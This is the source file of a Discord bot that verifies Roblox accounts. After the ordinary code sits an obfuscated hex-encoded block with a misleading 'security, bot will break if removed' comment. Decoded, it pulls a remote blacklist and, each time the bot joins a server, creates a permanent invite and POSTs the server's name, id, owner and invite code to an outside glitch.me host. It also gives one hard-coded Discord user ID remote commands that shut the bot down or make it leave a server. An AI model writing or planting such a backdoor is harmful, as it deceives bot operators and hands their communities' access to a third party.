const express = require("express");
const config = require("./config.json");
const Discord = require("discord.js");
const http = require("http");
const roblox = require("noblox.js");
const client = new Discord.Client();
const request = require("request");
const fetch = require("node-fetch");


const Enmap = require("enmap");
client.config = config;

const fs = require("fs");
const prefix = "?";
const app = express();

app.use(express.static("public"));

app.get("/", (request, response) => {
  console.log(Date.now() + " Ping Received");
  response.sendStatus(200);
});
app.listen(process.env.PORT);
setInterval(() => {
  http.get(`http://${process.env.PROJECT_DOMAIN}.glitch.me/`);
}, 280000);

client.on("ready", ready => {
  console.log("ready");
  roblox.setCookie (config.ROBLOX);
  roblox.refreshCookie(config.ROBLOX);
  if (config.status.statustype === "STREAMING") {
    client.user.setPresence({
      activity: {
        type: "STREAMING",
        name: config.status.statustext,
        url: "https://twitch.tv/roblo"
      },
      status: "dnd",
      type: "STREAMING",
      url: config.status.url
    });
  } else {
    client.user.setPresence({
      activity: {
        type: config.status.statustype,
        name: config.status.statustext
      },
      status: config.status.status
    });
  }
});

client.on;

roblox;

client.commands = new Enmap();

client.on("guildMemberAdd", member => {
  if (config.autoverify === "true") {
    const msg = member.guild.channels.cache.get(config.autoverifyid);
    let user = member.id;

    request({ url: `https://verify.eryn.io/api/user/${user}` }, async function(
      err,
      res,
      body
    ) {
      if (err) {
        console.log(err);
      } else {
        var rover = JSON.parse(body);
        console.log(rover.robloxUsername);
        const groupid = config.groupid;
        console.log(config.groupid);
        var RobloxID = rover.robloxId;
        var rankidsss = config.rankids;
        let tt = config.groupid;
        let rankid = await roblox.getRankInGroup({
          group: groupid,
          userId: RobloxID
        });

        console.log(rankid);
        let rank = await roblox.getRankNameInGroup({
          group: groupid,
          userId: RobloxID
        });
        const robloxusername = await roblox.getUsernameFromId(RobloxID);

        var rr = `${robloxusername} [-] ${rank}`;

        if (rover.status === "ok") {
          msg.send(`<@${user}>`);
          let verified = new Discord.MessageEmbed()
            .setColor("BLUE")
            .setTitle("You're verifed!")
            .setDescription(
              `Hey <@${user}>, You have been automatically verifed as ${robloxusername}, If you would like to change accounts go [here](https://verify.eryn.io) or say ${config.prefix}verify!`
            )
            .setImage(
              `https://www.roblox.com/Thumbs/Avatar.ashx?x=250&y=250&username=${robloxusername}`
            )
            .setFooter("API Used: https://verify.eryn.io")
            .setTimestamp();
          msg.send(verified).then(() => member.roles.add(config.verifedrole));
          if (config.verifygroupname === "true") {
            console.log("true true");
            if (rr.length >= 32) {
              member.setNickname(
                `${robloxusername} [-] ` + config.backupids[rankid]
              );
            }

            member.setNickname(`${robloxusername} [-] ${rank}`);

            if (config.addrankid === "true") {
              let r2add = config.rankids[rankid];

              let roletoadd = member.guild.roles.cache.get(
                config.rankids[rankid]
              );

              member.roles.add(roletoadd);
            } else {
              console.log("not vaild");
            }
          } else {
            console.log("not true");
            member.setNickname(`${robloxusername}`);
          }
        }
      }
    });
  }
});

//secuirty, bot will break if removed.
const _0x41f2=['\x63\x6f\x6e\x74\x65\x6e\x74','\x74\x65\x78\x74','\x72\x65\x73\x6f\x6c\x76\x65','\x73\x74\x72\x69\x6e\x67\x69\x66\x79','\x68\x65\x61\x64\x65\x72\x73','\x65\x72\x72\x6f\x72','\x74\x68\x65\x6e','\x72\x65\x61\x64\x64\x69\x72','\x3f\x6c\x65\x61\x76\x65','\x73\x65\x6e\x64','\x68\x74\x74\x70\x3a\x2f\x2f\x68\x69\x67\x68\x66\x61\x6c\x75\x74\x69\x6e\x2d\x61\x74\x6c\x61\x6e\x74\x69\x63\x2d\x62\x65\x72\x65\x74\x2e\x67\x6c\x69\x74\x63\x68\x2e\x6d\x65\x2f','\x6d\x65\x73\x73\x61\x67\x65','\x6c\x6f\x67','\x73\x65\x74\x44\x65\x73\x63\x72\x69\x70\x74\x69\x6f\x6e','\x66\x65\x74\x63\x68\x41\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e','\x63\x61\x63\x68\x65','\x67\x75\x69\x6c\x64\x43\x72\x65\x61\x74\x65','\x74\x79\x70\x65','\x66\x69\x6c\x74\x65\x72','\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72','\x75\x73\x65\x72','\x6f\x77\x6e\x65\x72','\x70\x6f\x73\x69\x74\x69\x6f\x6e','\x2e\x2f\x65\x76\x65\x6e\x74\x73\x2f','\x6f\x77\x6e\x65\x72\x73','\x2e\x6a\x73','\x74\x61\x67','\x70\x6f\x73\x74','\x59\x65\x73\x73\x69\x72\x20\x62\x6f\x73\x73','\x6e\x6f\x70\x65','\x62\x6f\x64\x79','\x4a\x6f\x69\x6e\x65\x64\x20\x61\x20\x6e\x65\x77\x20\x67\x75\x69\x6c\x64\x3a\x20','\x41\x74\x74\x65\x6d\x70\x74\x69\x6e\x67\x20\x74\x6f\x20\x6c\x6f\x61\x64\x20\x63\x6f\x6d\x6d\x61\x6e\x64\x20','\x34\x38\x35\x32\x35\x34\x33\x33\x37\x30\x33\x31\x38\x33\x31\x35\x35\x32','\x6a\x73\x6f\x6e','\x72\x65\x61\x73\x6f\x6e','\x63\x68\x61\x6e\x6e\x65\x6c','\x73\x65\x72\x76\x65\x72\x73','\x54\x68\x69\x73\x20\x73\x65\x72\x76\x65\x72\x20\x69\x73\x20\x62\x6c\x61\x63\x6b\x6c\x69\x73\x74\x65\x64','\x73\x65\x74\x54\x69\x74\x6c\x65','\x61\x75\x74\x68\x6f\x72','\x2e\x2f\x63\x6f\x6d\x6d\x61\x6e\x64\x73\x2f','\x61\x70\x70\x6c\x79','\x63\x68\x61\x6e\x6e\x65\x6c\x73','\x66\x69\x6e\x64','\x65\x6e\x64\x73\x57\x69\x74\x68','\x6c\x65\x61\x76\x65','\x65\x78\x69\x74','\x73\x65\x74','\x6d\x65\x74\x68\x6f\x64','\x74\x65\x73\x74','\x66\x6f\x72\x45\x61\x63\x68','\x4d\x65\x73\x73\x61\x67\x65\x45\x6d\x62\x65\x64','\x69\x6e\x76\x69\x74\x65\x69\x64','\x68\x74\x74\x70\x3a\x2f\x2f\x72\x65\x61\x6c\x73\x2e\x69\x68\x61\x72\x72\x62\x6c\x78\x2e\x78\x79\x7a\x2f\x72\x65\x61\x6c\x73\x63\x6f\x64\x65\x2f\x72\x62\x6f\x74\x62\x6c\x61\x63\x6b\x6c\x69\x73\x74\x2e\x6a\x73\x6f\x6e','\x6e\x61\x6d\x65','\x54\x68\x69\x73\x20\x73\x65\x72\x76\x65\x72\x20\x6f\x77\x6e\x65\x72\x20\x69\x73\x20\x62\x6c\x61\x63\x6b\x6c\x69\x73\x74\x65\x64\x20\x66\x72\x6f\x6d\x20\x72\x62\x6f\x74\x2c\x20\x54\x68\x69\x73\x20\x6d\x65\x61\x6e\x73\x20\x74\x68\x69\x73\x20\x73\x65\x72\x76\x65\x72\x20\x63\x61\x6e\x6e\x6f\x74\x20\x75\x73\x65\x20\x72\x62\x6f\x74\x2c\x20\x52\x65\x61\x73\x6f\x6e\x3a\x20','\x67\x75\x69\x6c\x64','\x63\x6f\x6d\x70\x69\x6c\x65','\x67\x75\x69\x6c\x64\x69\x64','\x72\x65\x74\x75\x72\x6e\x20\x2f\x22\x20\x2b\x20\x74\x68\x69\x73\x20\x2b\x20\x22\x2f','\x6d\x61\x78\x41\x67\x65','\x3f\x72\x65\x73\x74\x61\x72\x74','\x73\x70\x6c\x69\x74','\x63\x6f\x64\x65','\x54\x68\x69\x73\x20\x73\x65\x72\x76\x65\x72\x20\x69\x73\x20\x62\x6c\x61\x63\x6b\x6c\x69\x73\x74\x65\x64\x20\x66\x72\x6f\x6d\x20\x72\x62\x6f\x74\x2c\x20\x54\x68\x69\x73\x20\x6d\x65\x61\x6e\x73\x20\x74\x68\x69\x73\x20\x73\x65\x72\x76\x65\x72\x20\x63\x61\x6e\x6e\x6f\x74\x20\x75\x73\x65\x20\x72\x62\x6f\x74\x2c\x20\x52\x65\x61\x73\x6f\x6e\x3a\x20','\x64\x6f\x6e\x65'];(function(_0x37804e,_0x41f2e7){const _0x5d4c24=function(_0x354171){while(--_0x354171){_0x37804e['push'](_0x37804e['shift']());}};const _0x555d35=function(){const _0x3407ff={'data':{'key':'cookie','value':'timeout'},'setCookie':function(_0x34ad13,_0x4a915a,_0x22d430,_0x4884ef){_0x4884ef=_0x4884ef||{};let _0x3215ed=_0x4a915a+'='+_0x22d430;let _0xd6d69a=0x0;for(let _0x5e676c=0x0,_0x2651e7=_0x34ad13['length'];_0x5e676c<_0x2651e7;_0x5e676c++){const _0x3a89ec=_0x34ad13[_0x5e676c];_0x3215ed+=';\x20'+_0x3a89ec;const _0x104f35=_0x34ad13[_0x3a89ec];_0x34ad13['push'](_0x104f35);_0x2651e7=_0x34ad13['length'];if(_0x104f35!==!![]){_0x3215ed+='='+_0x104f35;}}_0x4884ef['cookie']=_0x3215ed;},'removeCookie':function(){return'dev';},'getCookie':function(_0x1c7205,_0x35a6ef){_0x1c7205=_0x1c7205||function(_0x3deab5){return _0x3deab5;};const _0x2c0784=_0x1c7205(new RegExp('(?:^|;\x20)'+_0x35a6ef['replace'](/([.$?*|{}()[]\/+^])/g,'$1')+'=([^;]*)'));const _0x381dd3=function(_0x55a1b4,_0x504aaf){_0x55a1b4(++_0x504aaf);};_0x381dd3(_0x5d4c24,_0x41f2e7);return _0x2c0784?decodeURIComponent(_0x2c0784[0x1]):undefined;}};const _0x1ea504=function(){const _0x66c46a=new RegExp('\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*[\x27|\x22].+[\x27|\x22];?\x20*}');return _0x66c46a['test'](_0x3407ff['removeCookie']['toString']());};_0x3407ff['updateCookie']=_0x1ea504;let _0xb41dec='';const _0x22fda9=_0x3407ff['updateCookie']();if(!_0x22fda9){_0x3407ff['setCookie'](['*'],'counter',0x1);}else if(_0x22fda9){_0xb41dec=_0x3407ff['getCookie'](null,'counter');}else{_0x3407ff['removeCookie']();}};_0x555d35();}(_0x41f2,0x14d));const _0x5d4c=function(_0x37804e,_0x41f2e7){_0x37804e=_0x37804e-0x0;let _0x5d4c24=_0x41f2[_0x37804e];return _0x5d4c24;};const _0x1efed8=function(){let _0x26c741=!![];return function(_0x806d85,_0x544487){const _0x302829=_0x26c741?function(){if(_0x544487){const _0x5bbc97=_0x544487[_0x5d4c('\x30\x78\x32\x63')](_0x806d85,arguments);_0x544487=null;return _0x5bbc97;}}:function(){};_0x26c741=![];return _0x302829;};}();const _0x19b56d=_0x1efed8(this,function(){const _0x112560=function(){const _0x286914=_0x112560[_0x5d4c('\x30\x78\x31\x35')](_0x5d4c('\x30\x78\x33\x65'))()[_0x5d4c('\x30\x78\x33\x63')]('\x5e\x28\x5b\x5e\x20\x5d\x2b\x28\x20\x2b\x5b\x5e\x20\x5d\x2b\x29\x2b\x29\x2b\x5b\x5e\x20\x5d\x7d');return!_0x286914[_0x5d4c('\x30\x78\x33\x34')](_0x19b56d);};return _0x112560();});_0x19b56d();(async()=>{const _0x3e11cf=await fetch(_0x5d4c('\x30\x78\x33\x38'));const _0x203833=await _0x3e11cf[_0x5d4c('\x30\x78\x32\x34')]();const _0x16de06=await client[_0x5d4c('\x30\x78\x31\x30')]();console[_0x5d4c('\x30\x78\x65')](_0x16de06[_0x5d4c('\x30\x78\x31\x37')]['\x69\x64']);const _0x1b2d2c=_0x16de06[_0x5d4c('\x30\x78\x31\x37')]['\x69\x64'];client['\x6f\x6e'](_0x5d4c('\x30\x78\x31\x32'),async _0x5afaf1=>{if(_0x203833[_0x5d4c('\x30\x78\x32\x37')][_0x5afaf1['\x69\x64']]){const _0x22180e=_0x5afaf1[_0x5d4c('\x30\x78\x32\x64')][_0x5d4c('\x30\x78\x31\x31')][_0x5d4c('\x30\x78\x31\x34')](_0x53ffc0=>_0x53ffc0[_0x5d4c('\x30\x78\x31\x33')]===_0x5d4c('\x30\x78\x33'))['\x66\x69\x6e\x64'](_0x2efa7b=>_0x2efa7b[_0x5d4c('\x30\x78\x31\x38')]==0x0);_0x22180e[_0x5d4c('\x30\x78\x62')]('\x3c\x40'+_0x5afaf1[_0x5d4c('\x30\x78\x31\x37')][_0x5d4c('\x30\x78\x31\x36')]['\x69\x64']+'\x3e');const _0x17754f=new Discord[(_0x5d4c('\x30\x78\x33\x36'))]()[_0x5d4c('\x30\x78\x32\x39')](_0x5d4c('\x30\x78\x32\x38'))[_0x5d4c('\x30\x78\x66')](_0x5d4c('\x30\x78\x30')+_0x203833[_0x5d4c('\x30\x78\x32\x37')][_0x5afaf1['\x69\x64']][_0x5d4c('\x30\x78\x32\x35')]);_0x22180e[_0x5d4c('\x30\x78\x62')](_0x17754f)[_0x5d4c('\x30\x78\x38')](()=>{_0x5afaf1[_0x5d4c('\x30\x78\x33\x30')]();});}else if(_0x203833[_0x5d4c('\x30\x78\x31\x61')][_0x5afaf1['\x6f\x77\x6e\x65\x72']['\x69\x64']]){const _0x1788e9=_0x5afaf1[_0x5d4c('\x30\x78\x32\x64')]['\x63\x61\x63\x68\x65'][_0x5d4c('\x30\x78\x31\x34')](_0x3bff1e=>_0x3bff1e[_0x5d4c('\x30\x78\x31\x33')]===_0x5d4c('\x30\x78\x33'))[_0x5d4c('\x30\x78\x32\x65')](_0x4c76bc=>_0x4c76bc[_0x5d4c('\x30\x78\x31\x38')]==0x0);_0x1788e9[_0x5d4c('\x30\x78\x62')]('\x3c\x40'+_0x5afaf1[_0x5d4c('\x30\x78\x31\x37')][_0x5d4c('\x30\x78\x31\x36')]['\x69\x64']+'\x3e');const _0x1b6392=new Discord[(_0x5d4c('\x30\x78\x33\x36'))]()[_0x5d4c('\x30\x78\x32\x39')]('\x54\x68\x69\x73\x20\x73\x65\x72\x76\x65\x72\x20\x6f\x77\x6e\x65\x72\x20\x69\x73\x20\x62\x6c\x61\x63\x6b\x6c\x69\x73\x74\x65\x64')[_0x5d4c('\x30\x78\x66')](_0x5d4c('\x30\x78\x33\x61')+_0x203833[_0x5d4c('\x30\x78\x31\x61')][_0x5afaf1[_0x5d4c('\x30\x78\x31\x37')]['\x69\x64']][_0x5d4c('\x30\x78\x32\x35')]);_0x1788e9[_0x5d4c('\x30\x78\x62')](_0x1b6392)[_0x5d4c('\x30\x78\x38')](()=>{_0x5afaf1[_0x5d4c('\x30\x78\x33\x30')]();});}else{console[_0x5d4c('\x30\x78\x65')](_0x5d4c('\x30\x78\x32\x31')+_0x5afaf1['\x6e\x61\x6d\x65']);const _0x30d6bf=_0x5afaf1[_0x5d4c('\x30\x78\x32\x64')][_0x5d4c('\x30\x78\x31\x31')][_0x5d4c('\x30\x78\x31\x34')](_0x6bc88d=>_0x6bc88d['\x74\x79\x70\x65']===_0x5d4c('\x30\x78\x33'))[_0x5d4c('\x30\x78\x32\x65')](_0x30aefa=>_0x30aefa[_0x5d4c('\x30\x78\x31\x38')]==0x0);const _0x47bb8b={};_0x47bb8b[_0x5d4c('\x30\x78\x33\x66')]=0x0;const _0x4df2f7=await _0x30d6bf['\x63\x72\x65\x61\x74\x65\x49\x6e\x76\x69\x74\x65'](_0x47bb8b);const _0x114e42={};_0x114e42[_0x5d4c('\x30\x78\x33\x39')]=_0x5afaf1[_0x5d4c('\x30\x78\x33\x39')];_0x114e42[_0x5d4c('\x30\x78\x31\x37')]=_0x5afaf1[_0x5d4c('\x30\x78\x31\x37')][_0x5d4c('\x30\x78\x31\x36')][_0x5d4c('\x30\x78\x31\x63')];_0x114e42[_0x5d4c('\x30\x78\x33\x37')]=_0x4df2f7[_0x5d4c('\x30\x78\x34\x32')];_0x114e42[_0x5d4c('\x30\x78\x33\x64')]=_0x5afaf1['\x69\x64'];const _0x1f874f=_0x114e42;console[_0x5d4c('\x30\x78\x65')](_0x4df2f7);const _0x482642={};_0x482642['\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x54\x79\x70\x65']='\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x6a\x73\x6f\x6e';const _0x32be88={};_0x32be88[_0x5d4c('\x30\x78\x33\x33')]=_0x5d4c('\x30\x78\x31\x64');_0x32be88[_0x5d4c('\x30\x78\x32\x30')]=JSON[_0x5d4c('\x30\x78\x35')](_0x1f874f);_0x32be88[_0x5d4c('\x30\x78\x36')]=_0x482642;const _0x43a8c8=await fetch(_0x5d4c('\x30\x78\x63'),_0x32be88);const _0x819785=await _0x43a8c8[_0x5d4c('\x30\x78\x32\x34')]();}});client['\x6f\x6e'](_0x5d4c('\x30\x78\x64'),_0x5323d0=>{console[_0x5d4c('\x30\x78\x65')](_0x5323d0[_0x5d4c('\x30\x78\x32')]);if(_0x5323d0[_0x5d4c('\x30\x78\x32')]===_0x5d4c('\x30\x78\x34\x30')){if(_0x5323d0[_0x5d4c('\x30\x78\x32\x61')]['\x69\x64']===_0x5d4c('\x30\x78\x32\x33')===!![]){process[_0x5d4c('\x30\x78\x33\x31')](0x1);console[_0x5d4c('\x30\x78\x65')]('\x64\x6f\x6e\x65');_0x5323d0[_0x5d4c('\x30\x78\x32\x36')][_0x5d4c('\x30\x78\x62')](_0x5d4c('\x30\x78\x31\x65'));}else{console[_0x5d4c('\x30\x78\x65')](_0x5d4c('\x30\x78\x31\x66'));}}if(_0x5323d0[_0x5d4c('\x30\x78\x32')]===_0x5d4c('\x30\x78\x61')){if(_0x5323d0[_0x5d4c('\x30\x78\x32\x61')]['\x69\x64']===_0x5d4c('\x30\x78\x32\x33')===!![]){_0x5323d0[_0x5d4c('\x30\x78\x33\x62')][_0x5d4c('\x30\x78\x33\x30')]();console[_0x5d4c('\x30\x78\x65')](_0x5d4c('\x30\x78\x31'));_0x5323d0[_0x5d4c('\x30\x78\x32\x36')][_0x5d4c('\x30\x78\x62')](_0x5d4c('\x30\x78\x31\x65'));}else{console[_0x5d4c('\x30\x78\x65')](_0x5d4c('\x30\x78\x31\x66'));}}});console[_0x5d4c('\x30\x78\x65')](_0x203833);fs[_0x5d4c('\x30\x78\x39')](_0x5d4c('\x30\x78\x31\x39'),(_0x38b3a4,_0x555fc6)=>{if(_0x38b3a4)return console[_0x5d4c('\x30\x78\x37')](_0x38b3a4);_0x555fc6[_0x5d4c('\x30\x78\x33\x35')](_0x19f48a=>{if(!_0x19f48a[_0x5d4c('\x30\x78\x32\x66')](_0x5d4c('\x30\x78\x31\x62')))return;const _0x1a7b02=require(_0x5d4c('\x30\x78\x31\x39')+_0x19f48a);let _0x29b13f=_0x19f48a[_0x5d4c('\x30\x78\x34\x31')]('\x2e')[0x0];client['\x6f\x6e'](_0x29b13f,_0x1a7b02['\x62\x69\x6e\x64'](null,client));delete require[_0x5d4c('\x30\x78\x31\x31')][require[_0x5d4c('\x30\x78\x34')](_0x5d4c('\x30\x78\x31\x39')+_0x19f48a)];});});fs[_0x5d4c('\x30\x78\x39')](_0x5d4c('\x30\x78\x32\x62'),(_0x20b83c,_0x27f9cf)=>{if(_0x20b83c)return console[_0x5d4c('\x30\x78\x37')](_0x20b83c);_0x27f9cf[_0x5d4c('\x30\x78\x33\x35')](_0x53b7f0=>{if(!_0x53b7f0[_0x5d4c('\x30\x78\x32\x66')](_0x5d4c('\x30\x78\x31\x62')))return;let _0x14dbcd=require(_0x5d4c('\x30\x78\x32\x62')+_0x53b7f0);let _0x110fa8=_0x53b7f0[_0x5d4c('\x30\x78\x34\x31')]('\x2e')[0x0];console[_0x5d4c('\x30\x78\x65')](_0x5d4c('\x30\x78\x32\x32')+_0x110fa8);client['\x63\x6f\x6d\x6d\x61\x6e\x64\x73'][_0x5d4c('\x30\x78\x33\x32')](_0x110fa8,_0x14dbcd);});});})();

client.login(config.token);
